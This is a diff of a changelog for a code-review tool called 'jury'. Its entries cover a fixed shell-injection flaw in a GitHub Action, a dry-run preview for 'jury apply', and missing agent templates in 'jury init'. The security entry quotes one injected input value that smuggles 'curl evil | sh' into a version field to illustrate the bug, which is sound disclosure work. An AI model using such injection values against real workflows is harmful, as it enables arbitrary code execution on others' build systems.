@@ -6,14 +6,12 @@ The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
 and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
 ## [Unreleased]
+
 ### Security
 - **Shell Injection via `inputs.version`** (#604):
   - `action.yml`'s install step interpolated `${{ inputs.version }}` directly into its `run:` body. A GitHub expression is substituted textually before bash parses the line, so a caller passing `version: '1.0"; curl evil | sh; "'` executes arbitrary shell in the action's step. #584 moved `args`, the PR number and the base ref into `env:` for exactly this reason and left this one behind — the sweep it described in the plural was done in the singular.
   - Now passed as `INPUT_VERSION` through `env:` like every other caller-supplied input.
   - The guard is a rule over every step, not an assertion about one line: no `run:` body may contain a `${{ }}` expression, with a vacuity check so it cannot pass when there are no run bodies left, and a positive counterpart asserting each input still reaches the script through `env:`.
-
-
-### Security
 - **`jury apply` Previews And Confirms Before It Writes** (#605): a destructive command no longer writes unannounced.
   - `--dry-run` prints the paths each suggestion would touch and writes nothing.
   - The preview is printed **before** any write, and comes from the same `git apply --check` probe the containment check uses — so it cannot disagree with what an apply would do, and it names a path the suggestion itself never claims (a rename target). Previously the per-suggestion output appeared *after* the write had happened.
@@ -29,6 +27,12 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   - **Found while fixing this, one step earlier:** the diff detection was `startswith("---") or "@@" in fix`. A rename-only or binary-only body has neither, so it never reached the git branch at all — it fell through to the line-replacement path, which wrote the diff *text* into the target file and reported success. Anything git can read as a patch now reaches the branch where containment is decided.
   - The previous test passed for the wrong reason: the secondary target did not exist in the fixture, so `git apply` failed on its own and the assertion landed on the error string — removing the guard entirely left it green. Every new fixture creates the secondary target, so the patch would otherwise apply cleanly.
   - Reachable only via `jury apply` run locally against a report derived from an untrusted diff; `action.yml` does not invoke it.
+
+### Fixed
+- **`jury init` Offered Seven of Eleven Agents** (#606):
+  - `KNOWN_AGENTS` is derived from `agent_templates()` instead of hand-listed. Four templates — `openrouter`, `deepseek`, `groq`, `aider` — shipped without ever reaching the tuple, so `--list-agents`, the wizard and `--preset all` could not see them while the unknown-agent error message named them. The CLI told users to choose from four options it never offered. #589 asked for exactly this and #590 rewrote the error message instead.
+  - Adding them naively broke `jury init --preset thorough` outright: three point at real vendor hosts, and the config validator refuses a non-loopback endpoint without `JURY_ALLOW_REMOTE_ENDPOINT`, so the generated config was rejected before it could be written. They are now listed and selectable by name always, and included in an "all" preset only once the opt-in is present.
+  - Both distinctions are derived from the templates rather than listed, so a new hosted template is covered the day it lands — a second hand-maintained roster is the defect this issue is about.
 
 ## [1.14.4] - 2026-08-19
 
